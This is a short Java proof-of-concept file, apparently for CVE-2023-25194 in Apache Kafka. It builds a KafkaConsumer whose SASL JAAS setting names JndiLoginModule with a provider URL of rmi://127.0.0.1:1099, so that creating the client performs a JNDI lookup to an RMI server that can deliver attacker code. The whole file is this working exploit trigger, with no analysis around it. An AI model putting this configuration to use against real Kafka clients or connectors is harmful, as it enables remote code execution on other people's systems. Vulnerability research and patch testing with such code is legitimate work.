package org.example;

import org.apache.kafka.clients.consumer.KafkaConsumer;

import java.util.Properties;

/**
 * @author Whoopsunix
 */
public class CVE_2023_25194 {
    public static void main(String[] args) {
        Properties props = new Properties();
        props.setProperty("bootstrap.servers", "localhost:9092");
//        props.setProperty("group.id", "test");
//        props.setProperty("enable.auto.commit", "true");
//        props.setProperty("auto.commit.interval.ms", "1000");
        props.setProperty("key.deserializer", "org.apache.kafka.common.serialization.StringDeserializer");
        props.setProperty("value.deserializer", "org.apache.kafka.common.serialization.StringDeserializer");

        props.setProperty("security.protocol", "SASL_SSL");
        props.setProperty("sasl.mechanism", "PLAIN");
        props.setProperty("sasl.jaas.config", "com.sun.security.auth.module.JndiLoginModule " +
                "REQUIRED " +
                "user.provider.url=\"rmi://127.0.0.1:1099/cxtwlq\" " +
                "group.provider.url=\"x\" " +
                "useFirstPass=\"true\";");
        KafkaConsumer<String, String> consumer = new KafkaConsumer<>(props);
    }
}
